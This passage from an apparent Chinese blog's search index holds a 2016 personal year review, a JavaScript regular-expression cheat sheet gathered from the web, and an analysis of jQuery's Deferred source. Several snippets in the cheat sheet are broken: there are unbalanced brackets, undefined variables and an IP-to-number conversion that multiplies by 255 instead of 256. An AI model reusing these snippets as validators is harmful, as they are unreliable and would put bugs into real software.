所以你不必伤感，也不用惋惜，纵然到江湖去赶上了春，也不必留住它。 因为这就是人生，有些事你留也留不住。 你一定要先学会忍受它的无情，才会懂得享受它的温柔。 ” ——古龙\n 前言 年关将至，总会回想起这一年，完成了哪些事情，未完成哪些事情，收获了什么。。。 想来想去，都是些小事情。这点小事，虽不值得大书特写轰轰烈烈纪念，但还是添两笔，记录一下。 \n 小结 一、学习  技术变得快，还要赶紧追。 用小站来整理学习笔记，效果不错。 阿尔法狗来了。。。  二、爱好  锻炼：2016没有练，腹肌木有了，胸肌木有了，嘛都木有了。 单车：这一年，断断续续骑了段时间，没有拉100公里以上的长途，速度也没飚过40公里时速。属于慢速短途悠闲骑。 其它没有玩耍的就不再啰嗦。  三、小站  小站开张半年，只攒了（复制）5篇文章，看来忙（懒）得不轻。 借索大侠的话说：“程序猿应该有自己的空间吧，虽然这个东西并不算什么”。有了小站，也方便做资料整理和学习记录。  四、其它 什么都木有干！！！\n五、计划  设定小目标，希望能够完成它。 加强锻炼，召回腹肌。 小站常更新。  后记 还有一事：前段时间坐三角翼小飞机，体验了爬升、俯冲、失重下降、大转弯、低空过场等动作。所以，以后如果有人问：你咋不上天呢？我就可以答：我真上过天，还吼过。。。 希望新一年，自己能够像小飞机那样飞得潇洒！\n 最后，祝各位看官：鸡年大吉，万事如意~~~ 友情推荐   Tuantuan.G：是设计师，也是小伙伴。有想法，有理念。爱画画，有创意。从视觉设计，到UI平面。哪怕通宵达旦，也要设计漂亮。。。去她那里逛逛吧：@Tuantuan.G\n  索洪波：是程序员，也是段子手，低调深刻有内涵。去他的小站看看吧：@索洪波\n ","permalink":"http://bingerambo.com/posts/2017/01/20166%E4%BA%86%E4%BB%80%E4%B9%88/","tags":["生活"],"title":"2016，6了什么"},{"categories":["JS"],"contents":" 从网上整理的JavaScript的正则表达式，实际项目使用时，还需再做测验 ——Binge\n 技巧  整数或者小数：^[0-9]+.{0,1}[0-9]{0,2}$\n只能输入数字：\u0026quot;^[0-9]*$\u0026quot;。\n只能输入n位的数字：\u0026quot;^\\d{n}$\u0026quot;。\n只能输入至少n位的数字：\u0026quot;^\\d{n,}$\u0026quot;。\n只能输入m~n位的数字：。\u0026quot;^\\d{m,n}$\u0026quot;\n只能输入零和非零开头的数字：\u0026quot;^(0|[1-9][0-9]*)$\u0026quot;。\n只能输入有两位小数的正实数：\u0026quot;^[0-9]+(.[0-9]{2})?$\u0026quot;。\n只能输入有1~3位小数的正实数：\u0026quot;^[0-9]+(.[0-9]{1,3})?$\u0026quot;。\n只能输入非零的正整数：\u0026quot;^+?[1-9][0-9]*$\u0026quot;。\n只能输入非零的负整数：\u0026quot;^-[1-9][0-9*$\u0026quot;。\n只能输入长度为3的字符：\u0026quot;^.{3}$\u0026quot;。\n只能输入由26个英文字母组成的字符串：\u0026quot;^[A-Za-z]+$\u0026quot;。\n只能输入由26个大写英文字母组成的字符串：\u0026quot;^[A-Z]+$\u0026quot;。\n只能输入由26个小写英文字母组成的字符串：\u0026quot;^[a-z]+$\u0026quot;。\n只能输入由数字和26个英文字母组成的字符串：\u0026quot;^[A-Za-z0-9]+$\u0026quot;。\n只能输入由数字、26个英文字母或者下划线组成的字符串：\u0026quot;^\\w+$\u0026quot;。\n验证用户密码：\u0026quot;^[a-zA-Z]\\w{5,17}$\u0026ldquo;正确格式为：以字母开头，长度在6~18之间，只能包含字符、数字和下划线。\n验证是否含有^%\u0026amp;',;=?$\u0026quot;等字符：\u0026quot;[^%\u0026amp;',;=?$\\x22]+\u0026quot;。\n只能输入汉字：\u0026quot;^[\\u4e00-\\u9fa5]{0,}$\u0026rdquo;\n验证Email地址：\u0026quot;^\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*$\u0026quot;。\n验证InternetURL：\u0026quot;^http://([\\w-]+.)+[\\w-]+(/[\\w-./?%\u0026amp;=]*)?$\u0026quot;。\n验证电话号码：\u0026quot;^((\\d{3,4}-)|\\d{3.4}-)?\\d{7,8}$\u0026ldquo;正确格式为：\u0026ldquo;XXX-XXXXXXX\u0026rdquo;、\u0026ldquo;XXXX-XXXXXXXX\u0026rdquo;、\u0026ldquo;XXX-XXXXXXX\u0026rdquo;、\u0026ldquo;XXX-XXXXXXXX\u0026rdquo;、\u0026ldquo;XXXXXXX\u0026quot;和\u0026quot;XXXXXXXX\u0026rdquo;。\n验证身份证号（15位或18位数字）：\u0026quot;^\\d{15}|\\d{18}$\u0026quot;。\n验证一年的12个月：\u0026quot;^(0?[1-9]|1[0-2])$\u0026ldquo;正确格式为：\u0026ldquo;01\u0026quot;～\u0026quot;09\u0026quot;和\u0026quot;1\u0026quot;～\u0026quot;12\u0026rdquo;。\n验证一个月的31天：\u0026quot;^((0?[1-9])|((1|2)[0-9])|30|31)$\u0026ldquo;正确格式为；\u0026ldquo;01\u0026quot;～\u0026quot;09\u0026quot;和\u0026quot;1\u0026quot;～\u0026quot;31\u0026rdquo;。\n匹配中文字符的正则表达式： [\\u4e00-\\u9fa5]\n匹配双字节字符(包括汉字在内)：[^\\x00-\\xff]\n   应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）\n1 2  String.prototype.len=function(){return this.replace(/[^\\x00-\\xff]/g,\u0026#34;aa\u0026#34;).length;}   技巧  匹配空行的正则表达式：\\n[\\s| ]*\\r\n匹配html标签的正则表达式：\u0026lt;(.)\u0026gt;(.)\u0026lt;/(.)\u0026gt;|\u0026lt;(.)/\u0026gt;\n匹配首尾空格的正则表达式：(^\\s*)|(\\s*$)\n   应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：\n1 2 3 4  String.prototype.trim = function() { return this.replace(/(^\\s*)|(\\s*$)/g, \u0026#34;\u0026#34;); }   利用正则表达式分解和转换IP地址：\n下面是利用正则表达式匹配IP地址，并将IP地址转换成对应数值的Javascript程序：\n1 2 3 4 5 6 7 8 9 10 11 12  function IP2V(ip) { re=/(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)/g //匹配IP地址的正则表达式 if(re.test(ip)) { return RegExp.$1*Math.pow(255,3))+RegExp.$2*Math.pow(255,2))+RegExp.$3*255+RegExp.$4*1 } else { throw new Error(\u0026#34;Not a valid IP address!\u0026#34;) } }   不过上面的程序如果不用正则表达式，而直接用split函数来分解可能更简单，程序如下：\n1 2 3  var ip=\u0026#34;10.100.20.168\u0026#34; ip=ip.split(\u0026#34;.\u0026#34;) alert(\u0026#34;IP值是：\u0026#34;+(ip[0]*255*255*255+ip[1]*255*255+ip[2]*255+ip[3]*1))   匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*\n匹配网址URL的正则表达式：http://([\\w-]+.)+[\\w-]+(/[\\w- ./?%\u0026amp;=]*)?\n利用正则表达式限制网页表单里的文本框输入内容：\n用正则表达式限制只能输入中文：\n1 2  var onkeyup=\u0026#34;value=value.replace(/[^\\u4E00-\\u9FA5]/g,\u0026#39;\u0026#39;)\u0026#34; var onbeforepaste=\u0026#34;clipboardData.setData(\u0026#39;text\u0026#39;,clipboardData.getData(\u0026#39;text\u0026#39;).replace(/[^\\u4E00-\\u9FA5]/g,\u0026#39;\u0026#39;))\u0026#34;   用正则表达式限制只能输入全角字符：\n1 2  var onkeyup=\u0026#34;value=value.replace(/[^\\uFF00-\\uFFFF]/g,\u0026#39;\u0026#39;)\u0026#34; var onbeforepaste=\u0026#34;clipboardData.setData(\u0026#39;text\u0026#39;,clipboardData.getData(\u0026#39;text\u0026#39;).replace(/[^\\uFF00-\\uFFFF]/g,\u0026#39;\u0026#39;))\u0026#34;   用正则表达式限制只能输入数字：\n1 2  var onkeyup=\u0026#34;value=value.replace(/[^\\d]/g,\u0026#39;\u0026#39;) \u0026#34; var onbeforepaste=\u0026#34;clipboardData.setData(\u0026#39;text\u0026#39;,clipboardData.getData(\u0026#39;text\u0026#39;).replace(/[^\\d]/g,\u0026#39;\u0026#39;))\u0026#34;   用正则表达式限制只能输入数字和英文：\n1 2  var onkeyup=\u0026#34;value=value.replace(/[\\W]/g,\u0026#39;\u0026#39;) \u0026#34; var onbeforepaste=\u0026#34;clipboardData.setData(\u0026#39;text\u0026#39;,clipboardData.getData(\u0026#39;text\u0026#39;).replace(/[^\\d]/g,\u0026#39;\u0026#39;))\u0026#34;   技巧  匹配中文字符的正则表达式： [\\u4e00-\\u9fa5]\n评注：匹配中文还真是个头疼的事，有了这个表达式就好办了\n匹配双字节字符(包括汉字在内)：[^\\x00-\\xff]\n评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）\n匹配空白行的正则表达式：\\n\\s*\\r\n评注：可以用来删除空白行\n匹配HTML标记的正则表达式：\u0026lt;(\\S*?)[^\u0026gt;]*\u0026gt;.*?|\u0026lt;.*? /\u0026gt;\n评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力\n匹配首尾空白字符的正则表达式：^\\s*|\\s*$\n评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式\n匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*\n评注：表单验证时很实用\n匹配网址URL的正则表达式：[a-zA-z]+://[^\\s]*\n评注：网上流传的版本功能很有限，上面这个基本可以满足需求\n匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$\n评注：表单验证时很实用\n匹配国内电话号码：\\d{3}-\\d{8}|\\d{4}-\\d{7}\n评注：匹配形式如 0511-4405222 或 021-87888822\n匹配腾讯QQ号：[1-9][0-9]{4,}\n评注：腾讯QQ号从10000开始\n匹配中国邮政编码：[1-9]\\d{5}(?!\\d)\n评注：中国邮政编码为6位数字\n匹配身份证：\\d{15}|\\d{18}\n评注：中国的身份证为15位或18位\n匹配ip地址：\\d+.\\d+.\\d+.\\d+\n评注：提取ip地址时有用\n匹配特定数字：\n^[1-9]\\d*$　//匹配正整数\n^-[1-9]\\d*$ //匹配负整数\n^-?[1-9]\\d*$　//匹配整数\n^[1-9]\\d*|0$　//匹配非负整数（正整数 + 0）\n^-[1-9]\\d*|0$　//匹配非正整数（负整数 + 0）\n^[1-9]\\d*.\\d*|0.\\d*[1-9]\\d*$　//匹配正浮点数\n^-([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*)$　//匹配负浮点数\n^-?([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*|0?.0+|0)$　//匹配浮点数\n^[1-9]\\d*.\\d*|0.\\d*[1-9]\\d*|0?.0+|0$　//匹配非负浮点数（正浮点数 + 0）\n^(-([1-9]\\d*.\\d*|0.\\d*[1-9]\\d*))|0?.0+|0$　//匹配非正浮点数（负浮点数 + 0）\n评注：处理大量数据时有用，具体应用时注意修正\n匹配特定字符串：\n^[A-Za-z]+$　//匹配由26个英文字母组成的字符串\n^[A-Z]+$　//匹配由26个英文字母的大写组成的字符串\n^[a-z]+$　//匹配由26个英文字母的小写组成的字符串\n^[A-Za-z0-9]+$　//匹配由数字和26个英文字母组成的字符串\n^\\w+$　//匹配由数字、26个英文字母或者下划线组成的字符串\n评注：最基本也是最常用的一些表达式\n整理出来的一些常用的正则表达式所属分类: JScript (三)\nEmail : /^\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*$/\nisEmail1 : /^\\w+([.-]\\w+)@\\w+([.-]\\w+).\\w+$/;\nisEmail2 : /^.@[^_]$/;\nPhone : /^(((\\d{3}))|(\\d{3}-))?((0\\d{2,3})|0\\d{2,3}-)?[1-9]\\d{6,7}$/\nMobile : /^(((\\d{3}))|(\\d{3}-))?13\\d{9}$/\nUrl : /^http://[A-Za-z0-9]+.[A-Za-z0-9]+[/=?%-\u0026amp;_~`@[]':+!]([^\u0026lt;\u0026gt;\u0026quot;\u0026quot;])$/\nIdCard : /^\\d{15}(\\d{2}[A-Za-z0-9])?$/\nCurrency : /^\\d+(.\\d+)?$/\nNumber : /^\\d+$/\nCode : /^[1-9]\\d{5}$/\nQQ : /^[1-9]\\d{4,8}$/\nInteger : /^[-+]?\\d+$/\nDouble : /^[-+]?\\d+(.\\d+)?$/\nEnglish : /^[A-Za-z]+$/\nChinese : /^[\\u0391-\\uFFE5]+$/\nUnSafe : /^(([A-Z]|[a-z]|\\d*|[-_~!@#$%^\u0026amp;*.()[]{}\u0026lt;\u0026gt;?\\/'\u0026quot;]*)|.{0,5})$|\\s/\nPassWord :^[\\w]{6,12}$\nZipCode : ^[\\d]{6}\n/^(+\\d+ )?((\\d+) )?[\\d ]+$/; //这个是国际通用的电话号码判断\n/^(1[0-2]\\d|\\d{1,2})$/; //这个是年龄的判断\n/^\\d+.\\d{2}$/; //这个是判断输入的是否为货币值\n   1 2 3 4 5 6 7 8 9 10 11  \u0026lt;!-- IP地址有效性验证函数--\u0026gt; \u0026lt;script language=javascript runat=server\u0026gt; ip_ip = \u0026#39;(25[0-5]|2[0-4]\\\\d|1\\\\d\\\\d|\\\\d\\\\d|\\\\d)\u0026#39;; ip_ipdot = ip + \u0026#39;\\\\.\u0026#39;; isIPaddress = new RegExp(\u0026#39;^\u0026#39;+ip_ipdot+ip_ipdot+ipdot+ip_ip+\u0026#39;$\u0026#39;); \u0026lt;/script\u0026gt;   应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）\n1  String.prototype.len=function(){return this.replace([^\\x00-\\xff]/g,\u0026#34;aa\u0026#34;).length;}   应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现，如下：\n1 2 3 4 5 6 7  String.prototype.trim = function() { return this.replace(/(^\\s*)|(\\s*$)/g, \u0026#34;\u0026#34;); }   技巧  匹配空行的正则表达式：\\n[\\s| ]*\\r\n匹配HTML标记的正则表达式：/\u0026lt;(.)\u0026gt;.\u0026lt;/\\1\u0026gt;|\u0026lt;(.*) /\u0026gt;/\n匹配首尾空格的正则表达式：(^\\s*)|(\\s*$)\n匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+).\\w+([-.]\\w+)*\n匹配网址URL的正则表达式：http://([\\w-]+.)+[\\w-]+(/[\\w- ./?%\u0026amp;=]*)?\n^\\d+$　//匹配非负整数（正整数 + 0）\n^[0-9][1-9][0-9]$　//匹配正整数\n^((-\\d+)|(0+))$　//匹配非正整数（负整数 + 0）\n^-[0-9][1-9][0-9]$　//匹配负整数\n^-?\\d+$　//匹配整数\n^\\d+(.\\d+)?$　//匹配非负浮点数（正浮点数 + 0）\n^(([0-9]+.[0-9][1-9][0-9])|([0-9][1-9][0-9].[0-9]+)|([0-9][1-9][0-9]))$　//匹配正浮点数\n^((-\\d+(.\\d+)?)|(0+(.0+)?))$　//匹配非正浮点数（负浮点数 + 0）\n^(-(([0-9]+.[0-9][1-9][0-9])|([0-9][1-9][0-9].[0-9]+)|([0-9][1-9][0-9])))$ //匹配负浮点数\n^(-?\\d+)(.\\d+)?$\n  ","permalink":"http://bingerambo.com/posts/2016/09/js%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%A7%E5%85%A8/","tags":["JS"],"title":"JS正则表达式大全"},{"categories":["JS"],"contents":" JQuery源码-Deferred 寥寥代码，犀利锋锐，设计思想，值得学习 ——Binge\n  Deferred的概念请看第一篇 http://www.cnblogs.com/aaronjs/p/3348569.html \u0026nbsp;\n****************** 构建Deferred对象时候的流程图**************************   \u0026nbsp;\n**********************源码解析********************** \u0026nbsp;\n因为callback被剥离出去后，整个deferred就显得非常的精简\n   jQuery.extend({ Deferred : \u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;color:rgb(0,0,255); line-height:1.5!important\u0026quot;\u0026gt;function\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;line-height:1.5!important\u0026quot;\u0026gt;(){} when : \u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;color:rgb(0,0,255); line-height:1.5!important\u0026quot;\u0026gt;function\u0026lt;/span\u0026gt;\u0026lt;span style=\u0026quot;line-height:1.5!important\u0026quot;\u0026gt;()  )}     对于extend的继承这个东东，在之前就提及过jquery如何处理内部jquery与init相互引用this的问题\n对于JQ的整体架构一定要弄懂 http://www.cnblogs.com/aaronjs/p/3278578.html 所以当jQuery.extend只有一个参数的时候，其实就是对jQuery静态方法的一个扩展\n我们在具体看看2个静态方法内部都干了些什么：\nDeferred整体结构：\n源码精简了部分代码\n   Deferred: function( func ) {var tuples =[//action, add listener, listener list, final state [ \u0026ldquo;resolve\u0026rdquo;, \u0026ldquo;done\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;once memory\u0026rdquo;), \u0026ldquo;resolved\u0026rdquo;], [ \u0026ldquo;reject\u0026rdquo;, \u0026ldquo;fail\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;once memory\u0026rdquo;), \u0026ldquo;rejected\u0026rdquo;], [ \u0026ldquo;notify\u0026rdquo;, \u0026ldquo;progress\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;memory\u0026rdquo;) ] ], state = \u0026ldquo;pending\u0026rdquo;, promise ={ state: function() {}, always: function() {}, then: function( /fnDone, fnFail, fnProgress /) { },//Get a promise for this deferred //If obj is provided, the promise aspect is added to the object promise: function( obj ) {} }, deferred ={}; jQuery.each( tuples, function( i, tuple ) { deferred[ tuple[0] + \u0026ldquo;With\u0026rdquo; ] =list.fireWith; }); promise.promise( deferred ); //All done! returndeferred; },      显而易见Deferred是个工厂类，返回的是内部构建的deferred对象    tuples 创建三个$.Callbacks对象，分别表示成功，失败，处理中三种状态  创建了一个promise对象，具有state、always、then、primise方法  扩展primise对象生成最终的Deferred对象，返回该对象   这里其实就是3个处理,但是有个优化代码的地方,就是把共性的代码给抽象出来,通过动态生成了\n具体源码分析:  Deferred自身则围绕这三个对象进行更高层次的抽象  触发回调函数列表执行(函数名) 添加回调函数（函数名） 回调函数列表（jQuery.Callbacks对象） deferred最终状态（第三组数据除外）     var tuples =[//action, add listener, listener list, final state [ \u0026ldquo;resolve\u0026rdquo;, \u0026ldquo;done\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;once memory\u0026rdquo;), \u0026ldquo;resolved\u0026rdquo;], [ \u0026ldquo;reject\u0026rdquo;, \u0026ldquo;fail\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;once memory\u0026rdquo;), \u0026ldquo;rejected\u0026rdquo;], [ \u0026ldquo;notify\u0026rdquo;, \u0026ldquo;progress\u0026rdquo;, jQuery.Callbacks(\u0026ldquo;memory\u0026rdquo;) ] ],     这里抽象出2组阵营： 1组：回调方法/事件订阅  done，fail，progress  2组：通知方法/事件发布  resolve，reject，notify，resolveWith，rejectWith，notifyWith  tuples 元素集 其实是把相同有共同特性的代码的给合并成一种结构，然后通过一次处理\n   jQuery.each( tuples, function( i, tuple ) {var list = tuple[ 2], stateString = tuple[ 3]; promise[ tuple[1] ] =list.add;if( stateString ) { list.add(function() { state =stateString;//[ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2].lock ); } deferred[ tuple[0] ] = function() { deferred[ tuple[0] + \u0026ldquo;With\u0026rdquo; ]( this === deferred ? promise : this, arguments );return this; }; deferred[ tuple[0] + \u0026ldquo;With\u0026rdquo; ] =list.fireWith; });     对于tuples的3条数据集是分2部分处理的\n第一部分将回调函数存入  promise[ tuple[1] ] = list.add;  其实就是给promise赋予3个回调函数\npromise.done = $.Callbacks(\u0026ldquo;once memory\u0026rdquo;).add  promise.fail = $.Callbacks(\u0026ldquo;once memory\u0026rdquo;).add  promise.progressl = $.Callbacks(\u0026ldquo;memory\u0026rdquo;).add  如果存在deferred最终状态\n默认会预先向doneList,failList中的list添加三个回调函数\n   if( stateString ) { list.add(function() {//state = [ resolved | rejected ] state =stateString;//[ reject_list | resolve_list ].disable; progress_list.lock }, tuples[ i ^ 1 ][ 2 ].disable, tuples[ 2 ][ 2].lock ); }     ************************************************************* 这里有个小技巧\ni ^ 1 按位异或运算符 所以实际上第二个传参数是1、0索引对调了，所以取值是failList.disable与doneList.disable\n*************************************************************  通过stateString有值这个条件，预先向doneList,failList中的list添加三个回调函数  分别是:\ndoneList : [changeState, failList.disable, processList.lock] failList : [changeState, doneList.disable, processList.lock]   changeState 改变状态的匿名函数，deferred的状态，分为三种：pending(初始状态), resolved(解决状态), rejected(拒绝状态)  不论deferred对象最终是resolve（还是reject），在首先改变对象状态之后，都会disable另一个函数列表failList(或者doneList)  然后lock processList保持其状态，最后执行剩下的之前done（或者fail）进来的回调函数  所以第一步最终都是围绕这add方法 done/fail/是list.add也就是 callbacks.add ，将回调函数存入回调对象中   第二部分很简单，给deferred对象扩充6个方法 resolve/reject/notify 是 callbacks.fireWith ，执行回调函数  resolveWith/rejectWith/notifyWith 是 callbacks.fireWith 队列方法引用   最后合并promise到deferred\npromise.promise( deferred ); jQuery.extend( obj, promise )  所以最终通过工厂方法Deferred构建的异步对象带的所有的方法了\nreturn 内部的deferred对象了\n 由此可见我们在\nvar defer = $.Deferred(); //构建异步对象  的时候,内部的对象就有了4个属性方法了\ndeferred: Object always: function () { done: function () { fail: function () { notify: function () { notifyWith: function ( context, args ) { pipe: function ( /* fnDone, fnFail, fnProgress */ ) { progress: function () { promise: function ( obj ) { reject: function () { rejectWith: function ( context, args ) { resolve: function () { resolveWith: function ( context, args ) { state: function () { then: function ( /* fnDone, fnFail, fnProgress */ ) {   promise: Object always: function () { done: function () { fail: function () { pipe: function ( /* fnDone, fnFail, fnProgress */ ) { progress: function () { promise: function ( obj ) { state: function () { then: function ( /* fnDone, fnFail, fnProgress */ ) {   state: \u0026ldquo;pending\u0026rdquo; tuples: Array[3]  构造图\n以上只是在初始化构建的时候，我们往下看看动态执行时候的处理\n *****************执行期***********************  一个最简单的demo为例子\n   var d =$.Deferred();\nsetTimeout(function(){ d.resolve(22) },0);\nd.then(function(val){ console.log(val); })     当延迟对象被 resolved 时，任何通过 deferred.then或deferred.done 添加的 doneCallbacks，都会被调用。回调函数的执行顺序和它们被添加的顺序是一样的。传递给 deferred.resolve() 的 args 参数，会传给每个回调函数。当延迟对象进入 resolved 状态后，再添加的任何 doneCallbacks，当它们被添加时，就会被立刻执行，并带上传入给 .resolve()的参数   换句话说，我们调用d.resolve(22) 就等于是调用\n匿名函数并传入参数值 22\nfunction(val){ console.log(val); //22 }  当前实际的使用中会有各种复杂的组合情况，但是整的外部调用流程就是这样的\n***************** resolve的实现 *******************  我们回顾下，其实Deferred对象，内部的实现还是Callbacks对象，只是在外面再封装了一层API，供接口调用 d.resolve(22)  实际上调用的就是通过这个代码生成的\ndeferred[ tuple[0] ] = function() { deferred[ tuple[0] + \u0026ldquo;With\u0026rdquo; ]( this === deferred ? promise : this, arguments );return this; }; deferred[ tuple[0] + \u0026ldquo;With\u0026rdquo; ] = list.fireWith;  deferred.resolveWith()  最终执行的就是 list.fireWith callbacks.fireWith()  所以最终又回到回调对象 callbacks中的私有方法 fire()了 Callbacks会通过\n callbacks.add()  把回调函数给注册到内部的 list = [] 上,我们回来过看看  deferred.then()  d.then(function(val){ console.log(val); })  ***************** then的实现 *******************     then: function( /*fnDone, fnFail, fnProgress */) {var fns =arguments;return jQuery.Deferred(function( newDefer ) { jQuery.each( tuples, function( i, tuple ) {var action = tuple[ 0], fn = jQuery.isFunction( fns[ i ] ) \u0026amp;\u0026amp;fns[ i ];//deferred[ done | fail | progress ] for forwarding actions to newDefer deferred[ tuple[1] ](function() {//省略\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip; }); }); fns = null; }).promise(); },     递归jQuery.Deferred 传递了func 链式调用了promise()  因为在异步对象的方法都是嵌套找作用域属性方法的 这里我额外的提及一下作用域 var d = $.Deferred();  这个异步对象d是作用域是如何呢？\n第一层：无可争议，浏览器环境下最外层是 window\n第二层：jquery本身是一个闭包\n第三层: Deferred工厂方法产生的作用域\n如果用d.then()方法呢？\n很明显then方法又是嵌套在内部的函数，所以执行的时候都默认会包含以上三层作用域+自己本身函数产生的作用域了\n我们用个简单图描绘下\n  根据规则，在最内部的函数能够访问上层作用域的所有的变量  我们先从使用的层面去考虑下结构设计: demo 1    var defer =$.Deferred();var filtered = defer.then(function( value ) {return value * 2; });\ndefer.resolve( 5);\nfiltered.done(function( value ) { console.log(value) //10 });     demo 2    var defer =$.Deferred();\ndefer.then(function(value) {return value * 2; }).then(function(value) {return value * 2; }).done(function(value) { alert(value) //20 });\ndefer.resolve( 5 );     其实这里就是涉及到defer.then().then().done() 链式调用了 API是这么定义的: deferred.then( doneFilter [, failFilter ] [, progressFilter ] )  从jQuery 1.8开始, 方法返回一个新的promise（承诺），通过一个函数，可以过滤deferred（延迟）的状态和值。替换现在过时的deferred.pipe()方法。 doneFilter 和 failFilter函数过滤原deferred（延迟）的解决/拒绝的状态和值。 progressFilter 函数过滤器的任何调用到原有的deferred（延迟）的notify 和 notifyWith的方法。 这些过滤器函数可以返回一个新的值传递给的 promise（承诺）的.done() 或 .fail() 回调，或他们可以返回另一个观察的对象（递延，承诺等）传递给它的解决/拒绝的状态和值promise（承诺）的回调。 如果过滤函数是空，或没有指定，promise（承诺）将得到与原来值相同解决（resolved）或拒绝（rejected）。   我们抓住几点：\n返回的是新的promise对象 内部有一个滤器函数  从demo 1中我们就能看到\n经过x.then()方法处理的代码中返回的this（filtered ）,不是原来的$.Deferred()所有产生的那个异步对象(defer )了 所以，每经过一个then那么内部处理的this都要被重新设置，那么为什么要这样处理呢？ 源码\n   then: function( /fnDone, fnFail, fnProgress /) {var fns =arguments;//分别为deferred的三个callbacklist添加回调函数，根据fn的是否是函数，分为两种情况 return jQuery.Deferred(function( newDefer ) { jQuery.each( tuples, function( i, tuple ) {var action = tuple[ 0], fn = jQuery.isFunction( fns[ i ] ) \u0026amp;\u0026amp;fns[ i ];//deferred[ done | fail | progress ] for forwarding actions to newDefer deferred[ tuple[1] ](function() {var returned = fn \u0026amp;\u0026amp; fn.apply( this, arguments );if ( returned \u0026amp;\u0026amp;jQuery.isFunction( returned.promise ) ) { returned.promise() .done( newDefer.resolve ) .fail( newDefer.reject ) .progress( newDefer.notify ); } else{ newDefer[ action + \u0026ldquo;With\u0026rdquo; ]( this === promise ? newDefer.promise() : this, fn ?[ returned ] : arguments ); } }); }); fns = null; }).promise(); },     在Deferred传递实参的时候，支持一个flag，jQuery.Deferred(func)\n传递一个回调函数\n//Call given func if any if( func ) { func.call( deferred, deferred ); }  所以newDefer可以看作是\nnewDefer = $.Deferred();  那么func回调的处理的就是过滤函数了\n   deferred[ tuple[1] ](function() {var returned = fn \u0026amp;\u0026amp; fn.apply( this, arguments );if ( returned \u0026amp;\u0026amp;jQuery.isFunction( returned.promise ) ) { returned.promise() .done( newDefer.resolve ) .fail( newDefer.reject ) .progress( newDefer.notify ); } else{ newDefer[ action + \u0026ldquo;With\u0026rdquo; ]( this === promise ? newDefer.promise() : this, fn ?[ returned ] : arguments ); } });     这里其实也有编译函数的概念，讲未来要执行的代码，预先通过闭包函数也保存起来，使其访问各自的作用域\n第一步\n分解tuples元素集\njQuery.each( tuples, function( i, tuple ) {//过滤函数第一步处理 }）  第二步\n分别为deferred[ done | fail | progress ]执行对应的add方法，增加过滤函数给done | fail | progress 方法 deferred[ tuple[1] ]（ 传入过滤函数 ）//过滤函数 执行的时候在分解  代码即\ndeferred[done] = list.add = callback.add  第三步\n返回return jQuery.Deferred().promise()\n此时构建了一个新的Deferred对象，但是返回的的是经过promise()方法处理后的，返回的是一个受限的promise对象 所以整个then方法就处理了2个事情\n构建一个新的deferred对象，返回受限的promise对象 给父deferred对象的[ done | fail | progress ]方法都增加一个过滤函数的方法  我们知道defer.then方法返回的是一个新的jQuery.Deferred().promise()对象\n那么我们把defer.then返回的称之为子对象,那么如何与父对象 var defer = $.Deferred() 关联的起来的 我看看源码\ndeferred[ tuple[1] ](//过滤函数//)  deferred其实就是根级父对象的引用,所以就嵌套再深,其实都是调用了父对象deferred[ done | fail | progress 执行add罢了 从图中就能很明显的看到 2个不同的deferred对象中 done fail progress分别都保存了不同的处理回调了  deferred.resolve( args )  当延迟对象被 resolved 时，任何通过 deferred.then 或 deferred.done  添加的 doneCallbacks，都会被调用  回调函数的执行顺序和它们被添加的顺序是一样的 传递给 deferred.resolve() 的 args 参数，会传给每个回调函数  当延迟对象进入 resolved 状态后，再添加的任何 doneCallbacks，当它们被添加时，就会被立刻执行，并带上传入给 .resolve() 的参数   流程如图\n流程解析：\n1 执行fire()方法，递归执行list所有包含的处理方法\n2 执行了默认的 changeState, disable, lock 方法、\n3 执行过滤函数\n根据 var returned = fn.apply( this, arguments )的返回值(称作returnReferred)是否是deferred对象 返回值是deferred对象，那么在returnReferred对象的三个回调函数列表中添加newDeferred的resolve(reject,notify)方法，也就是说newDeferrred的执行依赖returnDeferred的状态  不是函数的情况（如值为undefined或者null等），直接链接到newDeferred的resolve(reject,notify)方法，也就是说 newDeferrred的执行依赖外层的调用者deferred的状态或者说是执行动作（resolve还是reject或者是notify） 此时deferred.then()相当于将自己的callbacklist和newDeferred的callbacklist连接起来    下面就是嵌套deferred对象的划分了\n 源码还是要靠自己去折腾的\n思想的提高比较难的，我们可以借鉴设计的思路，代码书写方式都是有益无害的\n流程的分析已经比较透彻了，下一章在讲解when的实现\n写这东西太耗精力了，如果对您有帮助，请点击  推荐支持  一下……………  非常感谢《 jQuery 2.0.3 源码分析 Deferred（最细的实现剖析，带图）》转载文章和Aaron的教程图示，如对你有用，请推荐一把。 阅读原文\n $(function(){ $('img').each(function(index,element){ if($(this).attr('alt') == '复制代码'){ $(this).hide(); } }); });  